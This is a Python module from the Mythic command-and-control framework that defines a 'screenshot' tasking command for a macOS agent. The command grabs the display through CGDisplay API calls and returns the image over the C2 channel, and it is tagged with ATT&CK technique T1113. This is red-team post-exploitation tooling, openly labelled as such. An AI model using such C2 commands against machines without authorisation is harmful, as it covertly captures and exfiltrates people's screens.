from mythic_container.MythicCommandBase import *
import json
import datetime
from mythic_container.MythicRPC import *
from mythic_container.PayloadBuilder import *


class ScreenshotArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class ScreenshotCommand(CommandBase):
    cmd = "screenshot"
    needs_admin = False
    help_cmd = "screenshot"
    description = "Use the built-in CGDisplay API calls to capture the display and send it back over the C2 channel. No need to specify any parameters as the current time will be used as the file name"
    version = 1
    author = "@its_a_feature_"
    parameters = []
    attackmapping = ["T1113"]
    argument_class = ScreenshotArguments
    browser_script = BrowserScript(script_name="screenshot_new", author="@its_a_feature_", for_new_ui=True)
    supported_os = [SupportedOS.MacOS]

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        response.Params = str(f"screenshot:{datetime.datetime.utcnow()}")
        await SendMythicRPCArtifactCreate(MythicRPCArtifactCreateMessage(
            TaskID=taskData.Task.ID,
            ArtifactMessage=f"$.CGDisplayCreateImage($.CGMainDisplayID());, $.NSBitmapImageRep.alloc.initWithCGImage(cgimage);",
            BaseArtifactType="API"
        ))
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
